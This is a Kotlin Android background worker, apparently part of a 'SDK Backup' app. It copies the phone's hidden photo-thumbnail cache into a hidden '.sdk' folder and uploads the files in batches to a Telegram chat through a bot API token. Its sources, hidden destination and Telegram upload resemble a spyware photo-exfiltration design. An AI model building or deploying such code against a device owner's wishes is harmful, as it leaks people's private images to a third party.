package com.sujit.sdkbackup

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import android.os.Environment
import androidx.core.app.NotificationCompat
import androidx.work.CoroutineWorker
import androidx.work.ForegroundInfo
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.BufferedInputStream
import java.io.BufferedOutputStream
import java.io.File
import java.io.FileInputStream
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.atomic.AtomicInteger

class BackupWorker(appContext: Context, params: WorkerParameters) :
    CoroutineWorker(appContext, params) {

    private val prefs = applicationContext.getSharedPreferences("sdkbackup", Context.MODE_PRIVATE)

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        setForeground(createForegroundInfo("Scanning source and backup folders…"))
        val source = File(SOURCE)
        val dest = File(DEST)
        if (!source.exists() || !source.isDirectory) {
            setStatus(total = 0, copied = 0, uploaded = prefs.getInt("uploaded", 0),
                pending = 0, failed = prefs.getInt("failed", 0))
            log("Source folder does not exist: $SOURCE")
            return@withContext Result.success()
        }
        if (!dest.exists() && !dest.mkdirs()) {
            log("Cannot create destination: $DEST")
            return@withContext Result.retry()
        }

        var copied = 0
        var uploadedThisRun = 0
        var failedThisRun = 0
        val files = source.walkTopDown().filter { it.isFile && !it.name.endsWith(".tmp", true) }.toList()
        val seenDest = HashSet<String>()
        for (src in files) {
            if (isStopped) return@withContext Result.retry()
            val relative = src.relativeTo(source).path
            val target = File(dest, relative)
            seenDest.add(relative)
            try {
                target.parentFile?.mkdirs()
                val srcLength = src.length()
                val srcModified = src.lastModified()
                val metaKey = "copy:$relative"
                val old = prefs.getString(metaKey, null)
                val expected = "$srcLength:$srcModified"
                if (!target.exists() || target.length() != srcLength || old != expected) {
                    val temp = File(target.parentFile, target.name + ".tmp")
                    copyFile(src, temp)
                    if (temp.length() != srcLength) {
                        temp.delete()
                        failedThisRun++
                        log("Copy verification failed: $relative")
                        continue
                    }
                    if (target.exists() && !target.delete()) {
                        temp.delete()
                        failedThisRun++
                        continue
                    }
                    if (!temp.renameTo(target)) {
                        temp.copyTo(target, overwrite = true)
                        temp.delete()
                    }
                    prefs.edit().putString(metaKey, expected).apply()
                    copied++
                }
            } catch (e: Exception) {
                failedThisRun++
                log("Copy failed for $relative: ${e.javaClass.simpleName}: ${e.message}")
            }
        }

        val token = prefs.getString("bot_token", "").orEmpty()
        val chatId = prefs.getString("chat_id", "").orEmpty()
        if (token.isBlank() || chatId.isBlank()) {
            log("Telegram settings missing; local copy scan completed.")
            setStatus(files.size, copied, prefs.getInt("uploaded", 0), files.size, failedThisRun)
            return@withContext Result.success()
        }

        val destFiles = dest.walkTopDown().filter { it.isFile && !it.name.endsWith(".tmp", true) }.toList()
        var pending = 0
        val uploadedCount = prefs.getInt("uploaded", 0)
        var uploadedOverall = uploadedCount
        var attempted = 0
        for (file in destFiles) {
            if (isStopped) return@withContext Result.retry()
            val relative = file.relativeTo(dest).path
            val key = "upload:$relative"
            val fingerprint = "${file.length()}:${file.lastModified()}"
            if (prefs.getString(key, null) == fingerprint) continue
            pending++
            if (attempted >= MAX_UPLOADS_PER_RUN) continue
            attempted++
            try {
                val ok = uploadDocument(token, chatId, file)
                if (ok) {
                    prefs.edit().putString(key, fingerprint)
                        .putInt("uploaded", ++uploadedOverall)
                        .putString("last_success", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date()))
                        .apply()
                    uploadedThisRun++
                    pending--
                    log("Uploaded: $relative")
                } else {
                    failedThisRun++
                    log("Telegram rejected upload: $relative")
                }
            } catch (e: Exception) {
                failedThisRun++
                log("Upload failed for $relative: ${e.javaClass.simpleName}: ${e.message}")
            }
        }
        val failedOverall = prefs.getInt("failed", 0) + failedThisRun
        setStatus(files.size, copied, uploadedOverall, pending, failedOverall)
        log("Run finished: source=${files.size}, copied=$copied, uploaded=$uploadedThisRun, pending=$pending, failed=$failedThisRun")
        Result.success()
    }

    private fun setStatus(total: Int, copied: Int, uploaded: Int, pending: Int, failed: Int) {
        prefs.edit().putInt("total_seen", total).putInt("copied", copied)
            .putInt("uploaded", uploaded).putInt("pending", pending).putInt("failed", failed).apply()
    }

    private fun log(message: String) {
        android.util.Log.i("SDKBackup", message)
    }

    private fun copyFile(src: File, dst: File) {
        BufferedInputStream(FileInputStream(src)).use { input ->
            BufferedOutputStream(dst.outputStream()).use { output -> input.copyTo(output) }
        }
    }

    private fun uploadDocument(token: String, chatId: String, file: File): Boolean {
        val boundary = "SDKBackupBoundary${System.currentTimeMillis()}"
        val url = URL("https://api.telegram.org/bot$token/sendDocument")
        val conn = (url.openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            doOutput = true
            connectTimeout = 20000
            readTimeout = 120000
            setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            setRequestProperty("Connection", "close")
        }
        try {
            conn.outputStream.use { raw ->
                val out = raw.buffered()
                fun field(name: String, value: String) {
                    out.write("--$boundary\r\n".toByteArray())
                    out.write("Content-Disposition: form-data; name=\"$name\"\r\n\r\n".toByteArray())
                    out.write(value.toByteArray(Charsets.UTF_8))
                    out.write("\r\n".toByteArray())
                }
                field("chat_id", chatId)
                out.write("--$boundary\r\n".toByteArray())
                out.write("Content-Disposition: form-data; name=\"document\"; filename=\"${file.name.replace("\"", "_")}\"\r\n".toByteArray())
                out.write("Content-Type: application/octet-stream\r\n\r\n".toByteArray())
                FileInputStream(file).use { input -> input.copyTo(out) }
                out.write("\r\n--$boundary--\r\n".toByteArray())
                out.flush()
            }
            val code = conn.responseCode
            val body = (if (code in 200..299) conn.inputStream else conn.errorStream)
                ?.bufferedReader()?.use { it.readText() }.orEmpty()
            val json = try { JSONObject(body) } catch (_: Exception) { JSONObject() }
            return code in 200..299 && json.optBoolean("ok", false)
        } finally {
            conn.disconnect()
        }
    }

    private fun createForegroundInfo(text: String): ForegroundInfo {
        val manager = applicationContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            manager.createNotificationChannel(NotificationChannel(CHANNEL_ID, "Backup status", NotificationManager.IMPORTANCE_LOW))
        }
        val notification: Notification = NotificationCompat.Builder(applicationContext, CHANNEL_ID)
            .setContentTitle("SDK Backup running")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setOngoing(true)
            .build()
        return ForegroundInfo(NOTIFICATION_ID, notification)
    }

    companion object {
        const val SOURCE = "/storage/emulated/0/Pictures/.thumbnails"
        const val DEST = "/storage/emulated/0/Pictures/.sdk"
        const val TAG = "sdk-backup"
        const val PERIODIC_NAME = "sdk-backup-periodic"
        private const val CHANNEL_ID = "sdk_backup_channel"
        private const val NOTIFICATION_ID = 7312
        private const val MAX_UPLOADS_PER_RUN = 20
    }
}
